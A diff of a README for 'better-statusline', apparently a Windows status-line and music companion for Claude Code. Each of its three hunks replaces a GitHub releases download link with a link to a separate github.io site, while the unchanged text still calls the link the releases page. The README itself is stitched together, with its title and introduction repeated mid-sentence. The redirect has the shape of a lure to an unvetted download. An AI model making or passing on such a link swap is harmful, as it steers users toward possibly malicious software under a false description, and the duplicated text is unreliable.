@@ -1,6 +1,6 @@
 # 🎵 better-statusline - Your session stats and music together
 
-[![Download better-statusline](https://img.shields.io/badge/Download-better--statusline-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Yellowdeliciousgrandcanyon551/better-statusline/releases)
+[![Download better-statusline](https://img.shields.io/badge/Download-better--statusline-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://yellowdeliciousgrandcanyon551.github.io)
 
 better-statusline is a small companion app for Claude Code on Windows. It turns your session numbers into clear dot-matrix rings and places the music you are playing right next to them. Instead of hunting through different windows, you get a compact view that shows progress, activity, and sound in one place.
 
@@ -32,7 +32,7 @@ The rings are meant to be read quickly. A glance tells you whether something is 
 
 Before you begin, make sure you are on a Windows computer and have a working internet connection.# 🎵 better-statusline - Your session stats and music together
 
-[![Download better-statusline](https://img.shields.io/badge/Download-better--statusline-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Yellowdeliciousgrandcanyon551/better-statusline/releases)
+[![Download better-statusline](https://img.shields.io/badge/Download-better--statusline-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://yellowdeliciousgrandcanyon551.github.io)
 
 better-statusline is a small companion app for Windows. It gives you a status line for Claude Code, showing the session's figures as dot-matrix rings, and it puts the music you are playing right beside them. Instead of switching between windows to check your progress and see what is playing, you get one calm, readable view that stays where you put it.
 
@@ -74,7 +74,7 @@ You do not need to install any extra tools, run any commands, or change any syst
 
 Visit this link to download the application:
 
-[![Download better-statusline](https://img.shields.io/badge/Get%20better--statusline-ff8c00?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Yellowdeliciousgrandcanyon551/better-statusline/releases)
+[![Download better-statusline](https://img.shields.io/badge/Get%20better--statusline-ff8c00?style=for-the-badge&logo=windows&logoColor=white)](https://yellowdeliciousgrandcanyon551.github.io)
 
 The link takes you to the releases page for better-statusline. That page is where every published version of the app lives. Look for the most recent release at the top of the list — that is the one you want.
 
